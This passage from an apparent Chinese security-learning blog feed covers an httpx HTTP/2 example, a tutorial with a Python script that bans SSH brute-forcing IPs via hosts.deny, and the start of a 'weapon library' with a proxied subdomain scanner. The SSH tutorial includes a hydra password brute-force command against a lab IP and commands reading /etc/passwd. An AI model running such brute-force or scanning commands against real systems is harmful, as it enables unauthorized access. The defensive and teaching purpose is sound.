href="https://spa16.scrape.center/">https://spa16.scrape.center/</a></p><p><img src="/img/image-20230929170208257.png" alt="image-20230929170208257"></p><p>支持http2.0还需要安装2.0的支持：</p><p>pip install “httpx[http2]”</p><p>代码中配置：</p><p>client &#x3D; httpx.Client(http2&#x3D;True)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> httpx<br><br>url = <span class="hljs-string">&#x27;https://spa16.scrape.center/&#x27;</span><span class="hljs-comment">#使用http2</span><br>headers = &#123;<br>    <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36&quot;</span><br>&#125;<br>data = &#123;<br>    <span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;handsome r1&quot;</span><br>&#125;<br>client = httpx.Client(http2=<span class="hljs-literal">True</span>)<br><span class="hljs-comment">#response = client.get(url,headers=headers)</span><br><span class="hljs-comment">#post请求</span><br>response = client.post(<span class="hljs-string">&#x27;https://www.httpbin.org/post&#x27;</span>,headers=headers,data=data)<br><br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ssh暴力破解阻断</title>
    <link href="/2023/09/29/ssh%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E9%98%BB%E6%96%AD/"/>
    <url>/2023/09/29/ssh%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E9%98%BB%E6%96%AD/</url>
    
    <content type="html"><![CDATA[<h1 id="暴力破解的自动阻断"><a href="#暴力破解的自动阻断" class="headerlink" title="暴力破解的自动阻断"></a>暴力破解的自动阻断</h1><p>项目背景：</p><p>只要是暴漏在公网云服务器，每天都会有大量的暴力破解行为</p><p>解决方法：</p><p>1.更换端口（无济于事）<br>2.买云防护，waf （贵）</p><p>爆破破解的一个自动阻断</p><h2 id="re正则表达式"><a href="#re正则表达式" class="headerlink" title="re正则表达式"></a>re正则表达式</h2><h3 id="re模块"><a href="#re模块" class="headerlink" title="re模块"></a>re模块</h3><p><strong>findall</strong>  找到匹配到的所有子串，并返回一个列表，如果没有匹配到就返回空</p><p><img src="/img/image-20230905100541279.png" alt="image-20230905100541279"></p><p><strong>search</strong>函数 扫描整个字符串，并且返回第一个，如果没匹配到就返回空</p><p><img src="/img/image-20230905100937856.png" alt="image-20230905100937856"></p><p><strong>匹配元字符</strong></p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-string">\d</span>               匹配所有数字<span class="hljs-number">0</span>-<span class="hljs-number">9</span><br><span class="hljs-string">\D</span>               匹配非数字<br><span class="hljs-string">\w</span>               匹配所有单词字符，包括大小写字母 数字 下划线 中文<br><span class="hljs-string">\W</span>               匹配剩下的，空格 换行符 特殊字符<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230905101528009.png" alt="image-20230905101528009"></p><p><strong>匹配字符集</strong></p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs inform7">字符的集合，用<span class="hljs-comment">[]</span>表示，字符集内用“^”表示“非”<br>\d=<span class="hljs-comment">[0-9]</span><br>\D=<span class="hljs-comment">[ ^ 0-9]</span><br>\w!=<span class="hljs-comment">[a-zA-Z_0-9]</span>??? 还有中文<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230905102515659.png" alt="image-20230905102515659"></p><p><strong>匹配空白字符</strong></p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livescript">空白符包含：<br><span class="hljs-string">&#x27; &#x27;</span>空格    <span class="hljs-string">\n换行符</span>   <span class="hljs-string">\t制表符</span>   <span class="hljs-string">\r回车符</span><br>使用<span class="hljs-string">\s来匹配他们</span><br>[^<span class="hljs-string">\s]</span> = <span class="hljs-string">\S</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20230905102757945.png" alt="image-20230905102757945"></p><p>**{} **表示匹配标定字符数量</p><p><img src="/img/image-20230905103436862.png" alt="image-20230905103436862"></p><p><strong>特殊数量符号</strong></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">特殊数量符号：<br><span class="hljs-bullet">*              </span>匹配前一个字符0or无限次<br>+              匹配前一个字符1or无限次<br><span class="hljs-bullet">.              </span>匹配除换行符\n意外的任意1个字符<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230905104011139.png" alt="image-20230905104011139"></p><p><strong>字符组</strong><br>把字符用()括起来，叫字符组，目的就为将匹配成的字符串分组</p><p><img src="/img/image-20230905104828290.png" alt="image-20230905104828290"></p><p><strong>匹配参数模式</strong></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c">findall方法其实他有第三个参数，他是默认参数，参数模式。<br>re.I         忽略大小写<br>re.S         匹配空白符<br>多个参数用   “<span class="hljs-string">|”</span><br></code></pre></td></tr></table></figure><img src="/img/image-20230905105310566.png" alt="image-20230905105310566" style="zoom:80%;" /><h2 id="subprocess模块"><a href="#subprocess模块" class="headerlink" title="subprocess模块"></a>subprocess模块</h2><p><strong>项目需求：执行命令并将输出劫持实现日志的监控</strong></p><p>用于启动新的进程的模块，它可以用于执行外部命令，获取进程的输出，向进程发送输入和等待进程结束。</p><p>多进程协同，python里大概有这么三种方式<br>1.os.system函数<br>阻塞式<br>2.multiprocessing 模块<br>使用场景，密集型的计算</p><p>3.subprocess模块</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">subprocess.run </span>  执行指定的命令，等待命令执行完成后返回一个对象<br><span class="hljs-keyword">subprocess.call</span>执行指定的命令，返回命令执行的状态 （成功为<span class="hljs-number">0</span>  失败为非<span class="hljs-number">0</span>）<br><span class="hljs-keyword">subprocess.check_all</span>与上面类似，区别是会输出报错<br><span class="hljs-keyword">subprocess.getoutput</span>执行命令，返回结果<br></code></pre></td></tr></table></figure><p>参数说明：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">subprocess.<span class="hljs-built_in">run</span>(args, *, <span class="hljs-attribute">stdin</span>=None, <span class="hljs-attribute">input</span>=None, <span class="hljs-attribute">stdout</span>=None, <span class="hljs-attribute">stderr</span>=None, <span class="hljs-attribute">shell</span>=<span class="hljs-literal">False</span>, <span class="hljs-attribute">timeout</span>=None, <span class="hljs-attribute">check</span>=<span class="hljs-literal">False</span>, <span class="hljs-attribute">universal_newlines</span>=<span class="hljs-literal">False</span>)<br><br>subprocess.call(args, *, <span class="hljs-attribute">stdin</span>=None, <span class="hljs-attribute">stdout</span>=None, <span class="hljs-attribute">stderr</span>=None, <span class="hljs-attribute">shell</span>=<span class="hljs-literal">False</span>, <span class="hljs-attribute">timeout</span>=None)<br><br>args：要执行的命令，必须是个字符串，字符串参数列表<br>stdin stdout stderr : 子进程的标准输入 输出 错误 最常用的是subprocess.PIPE<br>timeout : 设置命令超时<br>shell : 值为bool，如果参数为ture 将通过操作系统的shell执行命令<br></code></pre></td></tr></table></figure><img src="/img/image-20230905111931877.png" alt="image-20230905111931877" style="zoom:67%;" /><img src="/img/image-20230905112026716.png" alt="image-20230905112026716" style="zoom:67%;" /><img src="/img/image-20230905112414933.png" alt="image-20230905112414933" style="zoom:67%;" /><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">subprocess.Popen (它是上述几个方法的父类)<br><span class="hljs-built_in">process</span> = subprocess.Popen(<br>cmd,<br><span class="hljs-built_in">shell</span>=True,<br><span class="hljs-keyword">stdout</span> = subprocess.PIPE,<br><span class="hljs-keyword">stdin</span> = subprocess.PIPE,<br><span class="hljs-keyword">stderr</span> = subprocess.PIPE)<br><br><span class="hljs-built_in">shell</span>: 打开终端，Linux中是终端，Windows中是cmd<br><span class="hljs-keyword">stdout</span>=subprocess.PIPE:如果该命令执行成功，那么将该命令的标准输出放入管道<br><br>终端输入命令分两种：<br><span class="hljs-number">1.</span>直接在终端输入<br><span class="hljs-number">2.</span>进入环境再输入，比如python<br></code></pre></td></tr></table></figure><p>在shell中执行命令：</p><p><img src="/img/image-20230905141601763.png" alt="image-20230905141601763"></p><p>在python终端中执行命令：</p><p><img src="/img/image-20230905141623837.png" alt="image-20230905141623837"></p><p>命令联动：</p><p><img src="/img/image-20230905142517181.png" alt="image-20230905142517181"></p><p><img src="/img/image-20230905142454064.png" alt="image-20230905142454064"></p><h2 id="Linux日志分析"><a href="#Linux日志分析" class="headerlink" title="Linux日志分析"></a>Linux日志分析</h2><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/var/</span>log/cron     记录系统的定时任务<br><span class="hljs-regexp">/var/</span>log/cups     打印信息的日志<br><span class="hljs-regexp">/var/</span>log/message    记录的系统重要信息的日志<br><span class="hljs-regexp">/var/</span>log/btmp       登录失败<br><span class="hljs-regexp">/var/</span>log/lastlog     最后一次登录<br><span class="hljs-regexp">/var/</span>log/wtmp      成功登录记录<br><span class="hljs-regexp">/var/</span>log/secure     登录日志<br><span class="hljs-regexp">/var/</span>log/utmp      目前登录用户的信息<br><br>登录成功     Accepted password <span class="hljs-keyword">for</span> root <span class="hljs-keyword">from</span> <span class="hljs-number">172.30</span>.<span class="hljs-number">230.1</span> port <span class="hljs-number">59865</span> ssh2<br>登录失败     Failed password <span class="hljs-keyword">for</span> root <span class="hljs-keyword">from</span> <span class="hljs-number">172.30</span>.<span class="hljs-number">230.1</span> port <span class="hljs-number">59891</span> ssh2<br><br>常用命令：<br><span class="hljs-keyword">find</span>  <span class="hljs-keyword">grep</span>  awk  sed  cat  tail  head<br></code></pre></td></tr></table></figure><p>案例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">/etc/passwd从第10行开始显示5行<br><span class="hljs-built_in">cat</span> /etc/passwd | <span class="hljs-built_in">tail</span> -n +10 | <span class="hljs-built_in">head</span> -n 5<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230905145051484.png" alt="image-20230905145051484"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">只显示<span class="hljs-regexp">/etc/</span>passwd的账户名<br>cat <span class="hljs-regexp">/etc/</span>passwd | awk -F <span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span><br></code></pre></td></tr></table></figure><img src="/img/image-20230905145301828.png" alt="image-20230905145301828" style="zoom:67%;" /><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle">定位有多少个ip在爆破主机的root账户   从<span class="hljs-regexp">/var/</span>log/secure中分析<br>登录失败：<span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;Failed password for root&quot;</span> <span class="hljs-regexp">/var/</span>log/secure | awk <span class="hljs-string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="hljs-keyword">sort</span> | uniq -c | <span class="hljs-keyword">sort</span> -nr<br><br>登录成功：<span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;Accepted&quot;</span> <span class="hljs-regexp">/var/</span>log/secure | awk <span class="hljs-string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="hljs-keyword">sort</span> | uniq -c | <span class="hljs-keyword">sort</span> -nr<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230905150423999.png" alt="image-20230905150423999"></p><p><img src="/img/image-20230905150508377.png" alt="image-20230905150508377"></p><p><strong>封禁</strong></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">hosts黑名单          /etc/hosts.deny<br>hosts白名单          /etc/hosts.allow<br>配置格式：<br>服务:地址:允许/封禁<br>服务： <br>ssh  ftp  smb  telnet 关键字（all）：禁止或允许运行所有的服务<br>all:<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">0</span>.<span class="hljs-number">10</span>:deny(全封)<br>all:<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">0</span>.<span class="hljs-number">10</span>:allow(加白)<br><br>地址：<br><span class="hljs-number">192.168.0.10</span><br><span class="hljs-number">192.168.0.10</span>/<span class="hljs-number">24</span>（封C段）<br><span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">0</span>.*（封C段）<br><span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">0</span>. （封C段）<br></code></pre></td></tr></table></figure><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs diff">密码爆破 hydra<br>hydra -l root -P 密码字典.txt -vV -e ns 10.210.100.131 ssh<br><span class="hljs-deletion">-l 指定用户</span><br><span class="hljs-deletion">-L 指定用户字典</span><br><span class="hljs-deletion">-P 指定密码字典</span><br><span class="hljs-deletion">-vV 显示提示信息</span><br><span class="hljs-deletion">-e ns 允许为空密码</span><br>ip<br>爆破的服务<br></code></pre></td></tr></table></figure><img src="/img/image-20230905152954772.png" alt="image-20230905152954772" style="zoom:67%;" /><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">封禁：<br><span class="hljs-symbol">sshd:</span><span class="hljs-number">10.210</span><span class="hljs-number">.100</span><span class="hljs-number">.128</span>:deny<br></code></pre></td></tr></table></figure><img src="/img/image-20230905153708461.png" alt="image-20230905153708461" style="zoom:67%;" /><p>攻击机无法连接和爆破</p><img src="/img/image-20230905153851379.png" alt="image-20230905153851379" style="zoom:80%;" /><p><img src="/img/image-20230905153939709.png" alt="image-20230905153939709"></p><h2 id="项目实现思路"><a href="#项目实现思路" class="headerlink" title="项目实现思路"></a>项目实现思路</h2><p>1.打开安全日志</p><p>2.实时监控安全日志</p><p>3.解析日志每一行的内容，找出正在爆破的ip</p><p>4.设置一个阈值，超过阈值后，封禁ip 添加到hosts.deny中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment">#安全日志</span><br>logFile = <span class="hljs-string">&#x27;/var/log/secure&#x27;</span><br><span class="hljs-comment">#黑名单</span><br>hostDeny = <span class="hljs-string">&#x27;/etc/hosts.deny&#x27;</span><br><span class="hljs-comment">#封禁阈值</span><br>password_wrong_num = <span class="hljs-number">5</span><br><br><span class="hljs-comment">#获取已经加入黑名单的ip，转换为字典</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getDenies</span>():<br>    deniedDict = &#123;&#125;<br>    <span class="hljs-built_in">list</span> = <span class="hljs-built_in">open</span>(hostDeny).readlines()<br>    <span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>:<br>        group = re.search(<span class="hljs-string">r&#x27;(\d+\.\d+\.\d+\.\d+)&#x27;</span>,ip)<br>        <span class="hljs-keyword">if</span> group:<br>            deniedDict[group[<span class="hljs-number">1</span>]] = <span class="hljs-string">&#x27;1&#x27;</span>  <span class="hljs-comment">#标记该ip为1</span><br>    <span class="hljs-keyword">return</span> deniedDict<br><br><span class="hljs-comment">#监控方法</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">monitorLog</span>(<span class="hljs-params">Logfile</span>):<br>    <span class="hljs-comment">#统计密码错误的次数</span><br>    tempIp = &#123;&#125;<br>    <span class="hljs-comment">#已经存到黑名单中的ip</span><br>    deniedDict = getDenies()<br>    <span class="hljs-comment">#读取安全日志</span><br>    popen = subprocess.Popen(<span class="hljs-string">&#x27;tail -f &#x27;</span>+logFile,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-comment">#开始监控</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        time.sleep(<span class="hljs-number">0.1</span>)<br>        <span class="hljs-comment">#读取日志</span><br>        line = popen.stdout.readline().strip()  <span class="hljs-comment">#str.strip() 去除字符串两边的空格</span><br>        <span class="hljs-keyword">if</span> line:<br>            <span class="hljs-comment">#出现Failed 说明：这个用户存在，但是密码错误</span><br>            <span class="hljs-comment">#出现Invalid 说明：这个用户都不存在</span><br>            group = re.search(<span class="hljs-string">&#x27;Invalid user \w+ from (\d+\.\d+\.\d+\.\d+)&#x27;</span>,<span class="hljs-built_in">str</span>(line))<br>            <span class="hljs-comment">#不存在用户直接封</span><br>            <span class="hljs-keyword">if</span> group <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> deniedDict.get(group[<span class="hljs-number">1</span>]):<br>                subprocess.getoutput(<span class="hljs-string">&#x27;echo \&#x27;sshd:&#123;&#125;\&#x27; &gt;&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(group[<span class="hljs-number">1</span>],hostDeny))<br>                deniedDict[group[<span class="hljs-number">1</span>]] = <span class="hljs-string">&#x27;1&#x27;</span><br>                time_str = time.strftime(<span class="hljs-string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>,time.localtime(time.time()))<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#123;&#125; --- and ip:&#123;&#125; to hosts.deny for invalid usr&#x27;</span>.<span class="hljs-built_in">format</span>(time_str,group[<span class="hljs-number">1</span>]))<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-comment">#用户名合法 （存在该用户） 密码错误</span><br>            group = re.search(<span class="hljs-string">&#x27;Failed password for \w+ from (\d+\.\d+\.\d+\.\d+)&#x27;</span>,<span class="hljs-built_in">str</span>(line))<br>            <span class="hljs-keyword">if</span> group:<br>                ip = group[<span class="hljs-number">1</span>]<br>                <span class="hljs-comment">#统计ip错误的次数</span><br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> tempIp.get(ip):<br>                    tempIp[ip] = <span class="hljs-number">1</span><br>                <span class="hljs-keyword">else</span>:<br>                    tempIp[ip] = tempIp[ip]+<span class="hljs-number">1</span><br>                <span class="hljs-comment">#如果错误次数大于阈值，封禁该ip</span><br>                <span class="hljs-keyword">if</span> tempIp[ip] &gt; password_wrong_num <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> deniedDict.get(ip):<br>                    <span class="hljs-keyword">del</span> tempIp[ip]<br>                    subprocess.getoutput(<span class="hljs-string">&#x27;echo \&#x27;sshd:&#123;&#125;\&#x27; &gt;&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(ip,hostDeny))<br>                    deniedDict[ip]=<span class="hljs-string">&#x27;1&#x27;</span><br>                    time_str = time.strftime(<span class="hljs-string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>,time.localtime(time.time()))<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#123;&#125; --- and ip:&#123;&#125; to hosts.deny for invalid password&#x27;</span>.<span class="hljs-built_in">format</span>(time_str,group[<span class="hljs-number">1</span>]))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    monitorLog(logFile)<br></code></pre></td></tr></table></figure><p>其中group[1]即匹配到的ip</p><img src="/img/image-20230929155319929.png" alt="image-20230929155319929" style="zoom:67%;" /><p>靶机启动脚本：</p><p><img src="/img/image-20230905170317267.png" alt="image-20230905170317267"></p><p>攻击机执行爆破：</p><p><img src="/img/image-20230905170308672.png" alt="image-20230905170308672"></p><p><img src="/img/image-20230929160659881.png" alt="image-20230929160659881"></p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>python武器库</title>
    <link href="/2023/09/22/python%E6%AD%A6%E5%99%A8%E5%BA%93/"/>
    <url>/2023/09/22/python%E6%AD%A6%E5%99%A8%E5%BA%93/</url>
    
    <content type="html"><![CDATA[<h1 id="pythonScript"><a href="#pythonScript" class="headerlink" title="pythonScript"></a>pythonScript</h1><p>菜鸡学习记录一下不同场景下的简单python脚本的编写 后续会继续优化和更新</p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>文章中所有内容仅供学习交流，不得用于其他任何目的，文中敏感内容已做脱敏处理，严禁用于商业和非法用途，否则由此产生的一切后果与作者无关</p><h2 id="子域名扫描器"><a href="#子域名扫描器" class="headerlink" title="子域名扫描器"></a>子域名扫描器</h2><p>思路：1.拼接子域名  2.观察返回包是否为200</p><p>代理配置：<a href="https://www.kuaidaili.com/">https://www.kuaidaili.com/</a></p><p>爆破字典：<a href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># 代理隧道域名:端口号  </span><br>tunnel = <span class="hljs-string">&quot;host:port&quot;</span><br><br><span class="hljs-comment"># 快代理使用用户名密码方式</span><br>username = <span class="hljs-string">&quot;xxx&quot;</span><br>password = <span class="hljs-string">&quot;xxx&quot;</span><br>proxies = &#123;<br>    <span class="hljs-string">&quot;http&quot;</span>: <span class="hljs-string">&quot;http://%(user)s:%(pwd)s@%(proxy)s/&quot;</span> % &#123;<span class="hljs-string">&quot;user&quot;</span>: username, <span class="hljs-string">&quot;pwd&quot;</span>: password, <span class="hljs-string">&quot;proxy&quot;</span>: tunnel&#125;,<br>    <span class="hljs-string">&quot;https&quot;</span>: <span class="hljs-string">&quot;http://%(user)s:%(pwd)s@%(proxy)s/&quot;</span> % &#123;<span class="hljs-string">&quot;user&quot;</span>: username, <span class="hljs-string">&quot;pwd&quot;</span>: password, <span class="hljs-string">&quot;proxy&quot;</span>: tunnel&#125;<br>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">domain_scan</span>(<span class="hljs-params">domain_name,sub_names</span>):<br>    <span class="hljs-keyword">for</span> sub <span class="hljs-keyword">in</span> sub_names:<br>        headers = &#123;<br>            <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; hu; rv:1.8.0.11) Gecko/20070312 Firefox/1.5.0.11&quot;</span>,<br>        &#125;<br>        url = <span class="hljs-string">f&quot;https://<span class="hljs-subst">&#123;sub&#125;</span>.<span class="hljs-subst">&#123;domain_name&#125;</span>&quot;</span><br>        <span class="hljs-keyword">try</span>:<br>            requests.head = headers<br>            <span class="hljs-comment">#挂上代理</span><br>            requests.get(url,proxies=proxies)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*]<span class="hljs-subst">&#123;url&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">except</span> requests.ConnectionError:<br>            <span class="hljs-comment">#print(&quot;error&quot;)</span><br>            <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    dom_name = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;please enter the domain name:&quot;</span>)<br><br>    <span class="hljs-comment">#子域名文件路径 </span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/xxx/xxx/subdomain.txt&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        sub_name = file.read()<br>        sub_dom = sub_name.splitlines()<br>        <span class="hljs-comment"># print(&quot;文件中存在的子域名数量：&#123;&#125;&quot;.format(len(sub_dom)))</span><br>        <span class="hljs-comment"># print(&quot;文件子域名列表&quot;)</span><br>        <span class="hljs-comment"># print(sub_dom)</span><br>        <br>    domain_scan(dom_name,sub_dom)<br></code></pre></td></tr></table></figure><h2 id="目录扫描器"><a href="#目录扫描器" class="headerlink" title="目录扫描器"></a>目录扫描器</h2><p>原理：1.拼接路径并请求   2.获取status_code，200则为成功 存在此目录</p><p>优化：加入面向对象 、多线程 、fake_useragent模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 